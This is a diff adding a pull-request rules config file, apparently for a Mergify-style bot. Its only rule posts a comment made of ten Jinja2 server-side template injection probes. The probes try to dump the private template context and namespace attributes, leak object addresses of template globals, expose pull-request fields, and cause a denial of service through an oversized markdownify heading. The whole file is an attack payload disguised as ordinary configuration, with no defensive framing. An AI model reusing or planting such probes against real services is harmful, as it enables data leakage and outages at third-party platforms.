@@ -1,1 +1,27 @@
-pull_request_rules: []
+pull_request_rules:
+  - name: ssti-oracle-probes
+    conditions: []
+    actions:
+      comment:
+        message: |
+          === G4o7T ORACLE PROBES ===
+          ---
+          [P1] ctx-pprint: {{ self._TemplateReference__context | pprint }}
+          ---
+          [P2] ctx-format: {{ '%r' | format(self._TemplateReference__context) }}
+          ---
+          [P3] ns-globals: {{ namespace(c=cycler, l=lipsum, j=joiner, n=namespace, r=range, s=self)._Namespace__attrs }}
+          ---
+          [P4] ns-with-ctx: {{ namespace(x=self._TemplateReference__context)._Namespace__attrs }}
+          ---
+          [P5] lipsum-addr: {{ '%s' | format(lipsum) }}
+          ---
+          [P6] cycler-addr: {{ '%s' | format(cycler) }}
+          ---
+          [P7] joiner-addr: {{ '%s' | format(joiner()) }}
+          ---
+          [P8] self-pprint: {{ self | pprint }}
+          ---
+          [P9] markdownify-dos: {{ '<h99999999>X' | markdownify }}
+          ---
+          [P10] ns-with-author: {{ namespace(a=author, b=body, f=files, h=head, ba=base)._Namespace__attrs }}
